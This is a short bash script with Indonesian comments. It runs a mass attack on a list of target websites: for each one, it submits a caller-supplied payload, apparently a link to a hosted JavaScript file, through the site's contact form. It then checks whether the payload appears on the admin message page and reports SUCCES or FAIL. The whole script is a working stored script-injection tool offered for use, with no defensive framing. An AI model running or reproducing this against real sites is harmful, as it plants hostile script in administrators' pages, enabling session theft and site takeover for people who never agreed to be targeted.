#!/bin/bash

f=3 b=4s
for j in f b; do
  for i in {0..7}; do
    printf -v $j$i %b "\e[${!j}${i}m"
  done
done

# Link Pastebin Script Jso Taro Disini
sc=$1;

read -p "Input List Target : " list;

for target in $(cat $list);
do
    curl --connect-timeout 5 -s -k -L -d "nama=orang&email=admin@admin.com&pesan=$sc&submit=Kirim Pesan" "$target/index.php?page=kirimpesan" -o /dev/null
    if [[ $(curl -s "$target/admin/hubungi.php" | grep "$sc") ]]; then
        echo "${f6}[${f1}!${f6}]${f4} $target => ${f6}[${f2}SUCCES${f6}]"
    else
        echo "${f6}[${f1}!${f6}]${f4} $target => ${f6}[${f1}FAIL${f6}]"
    fi
done            
